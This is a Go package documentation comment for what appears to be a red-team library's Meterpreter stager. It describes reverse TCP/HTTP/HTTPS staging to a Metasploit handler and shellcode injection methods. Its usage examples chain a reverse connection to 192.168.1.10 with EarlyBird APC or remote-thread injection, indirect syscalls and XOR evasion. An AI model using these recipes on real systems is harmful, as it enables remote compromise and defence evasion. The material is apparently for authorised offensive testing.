// Package meterpreter implements Metasploit Framework staging functionality
// for receiving and executing second-stage Meterpreter payloads.
//
// Technique: Meterpreter stager connecting to Metasploit multi/handler.
// MITRE ATT&CK: T1059 (Command and Scripting Interpreter), T1055 (Process Injection)
// Platform: Cross-platform (Windows and Linux)
// Detection: High -- Meterpreter staging is a well-known attack pattern;
// network signatures exist for all transport types.
//
// Supports three transport protocols:
//   - TCP: direct reverse TCP connection
//   - HTTP: reverse HTTP connection
//   - HTTPS: reverse HTTPS with optional InsecureSkipVerify
//
// # Stage Execution
//
// By default the stager uses a simple self-injection path:
//   - Windows: VirtualAlloc + RtlMoveMemory + VirtualProtect + CreateThread
//   - Linux: mmap + purego.SyscallN (System V AMD64 ABI)
//
// Set Config.Injector to override stage execution with any inject.Injector.
// This gives full access to the inject package's capabilities:
//   - 10+ Windows injection methods (CRT, APC, EarlyBird, Fiber, ETW, etc.)
//   - Builder pattern with fluent API: inject.Build().Method(...).Create()
//   - Syscall routing: WinAPI, NativeAPI, Direct, Indirect syscalls
//   - Decorator chain: WithXOR, WithCPUDelay, WithValidation
//   - Automatic fallback on failure
//
// See inject.AvailableMethods() for the full list of methods.
//
// On Linux, Config.Injector is not supported because the Meterpreter wrapper
// protocol requires the socket fd to read the ELF payload. An error is
// returned if Injector is set on Linux.
//
// # Usage
//
// Default self-injection (simplest):
//
//	cfg := &meterpreter.Config{
//	    Transport: meterpreter.TransportTCP,
//	    Host:      "192.168.1.10",
//	    Port:      "4444",
//	    Timeout:   30 * time.Second,
//	}
//	stager := meterpreter.NewStager(cfg)
//	err := stager.Stage(context.Background())
//
// With custom injector (EarlyBird APC + indirect syscalls + XOR evasion):
//
//	inj, _ := inject.Build().
//	    Method(inject.MethodEarlyBirdAPC).
//	    ProcessPath(`C:\Windows\System32\notepad.exe`).
//	    IndirectSyscalls().
//	    WithFallback().
//	    Use(inject.WithXOR).
//	    Use(inject.WithCPUDelay).
//	    Create()
//	cfg := &meterpreter.Config{
//	    Transport: meterpreter.TransportTCP,
//	    Host:      "192.168.1.10",
//	    Port:      "4444",
//	    Timeout:   30 * time.Second,
//	    Injector:  inj,
//	}
//	stager := meterpreter.NewStager(cfg)
//	err := stager.Stage(context.Background())
//
// With remote injection into existing process:
//
//	inj, _ := inject.Build().
//	    Method(inject.MethodCreateRemoteThread).
//	    TargetPID(1234).
//	    IndirectSyscalls().
//	    WithFallback().
//	    Create()
//	cfg := &meterpreter.Config{
//	    Transport: meterpreter.TransportHTTPS,
//	    Host:      "192.168.1.10",
//	    Port:      "8443",
//	    Timeout:   30 * time.Second,
//	    TLSInsecure: true,
//	    Injector:  inj,
//	}
//	stager := meterpreter.NewStager(cfg)
//	err := stager.Stage(context.Background())
package meterpreter
